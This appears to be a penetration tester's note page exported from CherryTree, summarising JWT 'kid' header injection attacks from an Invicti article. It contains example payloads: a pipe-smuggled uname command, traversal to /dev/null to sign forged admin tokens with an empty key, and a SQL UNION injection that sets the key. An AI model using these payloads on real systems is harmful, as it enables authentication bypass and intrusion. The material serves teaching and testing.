<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>kid parameter injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>kid parameter injection</h1><br/><strong><h2>kid parameter injections</h2></strong><br />The JWT header can contain the Key Id parameter kid. It is often used to retrieve the key from a database or filesystem. The application verifies the signature using the key obtained through the kid parameter. If the parameter is injectable, it can open the way to signature bypass or even attacks such as RCE, SQLi, and LFI.<br />To see this in action, let’s start with the following valid token:<br /><div class="codebox"><pre>{<br />  &quot;alg&quot;: &quot;HS256&quot;,<br />  &quot;typ&quot;: &quot;JWT&quot;,<br />  &quot;kid&quot;: &quot;key1&quot;<br />}.<br />{<br />  &quot;name&quot;: &quot;John Doe&quot;,<br />  &quot;user_name&quot;: &quot;john.doe&quot;,<br />  &quot;is_admin&quot;: false<br />}</pre></div><br />	<a href=""><img src="images/2268-1.png" alt="images/2268-1.png" /></a><br />	<span style="text-decoration:underline;">Base64URL encode and decode</span><br />      ▪ <a href="https://base64.guru/standards/base64url/encode">https://base64.guru/standards/base64url/encode</a><br />      ▪ <a href="https://base64.guru/standards/base64url/decode">https://base64.guru/standards/base64url/decode</a><br /><br /><br />The parameter <span style="text-decoration:underline;">is NOT vulnerable</span> if the crafted response give us something like this<br />	<a href=""><img src="images/2268-2.png" alt="images/2268-2.png" /></a><br /><br /><br />• <strong>kid parameter injection</strong><br />If the kid parameter is vulnerable to command injection, the following modification might lead to remote code execution:<br />	<div class="codebox"><pre>{<br />  &quot;alg&quot;: &quot;HS256&quot;,<br />  &quot;typ&quot;: &quot;JWT&quot;,<br />  &quot;kid&quot;: &quot;key1|/usr/bin/uname&quot;<br />}.<br />{<br />  &quot;name&quot;: &quot;John Doe&quot;,<br />  &quot;user_name&quot;: &quot;john.doe&quot;,<br />  &quot;is_admin&quot;: false<br />}</pre></div><br /><br /><br /><br />• <strong>kid parameter injection + directory traversal = signature bypass</strong><br />If an application uses the kid parameter to retrieve the key from the filesystem, it might be vulnerable to directory traversal. Then an attacker can force the application to use a file whose value the attacker can predict as a key for verification. This can be done using any static file within the application. Knowing the key file value, the attacker can craft a malicious token and sign it using the known key.<br />Continuing with the previous JWT example, an attacker might try to insert /dev/null as the key source to force the application to use an empty key:<br /><div class="codebox"><pre>{<br />  &quot;alg&quot;: &quot;HS256&quot;,<br />  &quot;typ&quot;: &quot;JWT&quot;,<br />  &quot;kid&quot;: &quot;../../../../../../dev/null&quot;<br />}.<br />{<br />  &quot;name&quot;: &quot;John Doe&quot;,<br />  &quot;user_name&quot;: &quot;john.doe&quot;,<br />  &quot;is_admin&quot;: true<br />}</pre></div><br /><br /><br />If directory traversal to /dev/null succeeds, the attacker will be able to sign a malicious token using an empty string. The same technique can be used with known static files, for example CSS files.<br /><br />• <strong>kid parameter injection + SQL injection = signature bypass</strong><br />If an application uses the kid parameter to retrieve the key from a database, it might be vulnerable to SQL injection. If successful, an attacker can control the value returned to the kid parameter from an SQL query and use it to sign a malicious token.<br />Again using the same example token, let’s say the application uses the following vulnerable SQL query to get its JWT key via the kid parameter:<br /><div class="codebox"><pre>SELECT key FROM keys WHERE key=&#39;key1&#39;</pre></div><br /><br /><br />An attacker can then inject a UNION SELECT statement into the kid parameter to control the key value:<br /><div class="codebox"><pre>{<br />  &quot;alg&quot;: &quot;HS256&quot;,<br />  &quot;typ&quot;: &quot;JWT&quot;,<br />  &quot;kid&quot;: &quot;xxxx&#39; UNION SELECT &#39;aaa&quot;<br />}.<br />{<br />  &quot;name&quot;: &quot;John Doe&quot;,<br />  &quot;user_name&quot;: &quot;john.doe&quot;,<br />  &quot;is_admin&quot;: true<br />}</pre></div><br /><br /><br />If SQL injection succeeds, the application will use the following query to retrieve the signature key:<br />SELECT key FROM keys WHERE key=&#39;xxxx&#39; UNION SELECT &#39;aaa&#39;Copy<br /><br /><br />This query returns aaa into the kid parameter, allowing the attacker to sign a malicious token simply with aaa. <br />To avoid these and other injection attacks, applications should always sanitize the value of the kid parameter before using it.<br /><br /><br /><br /><br />Bibliography:<br /><a href="https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/">https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/</a></div>
</body>
</html>
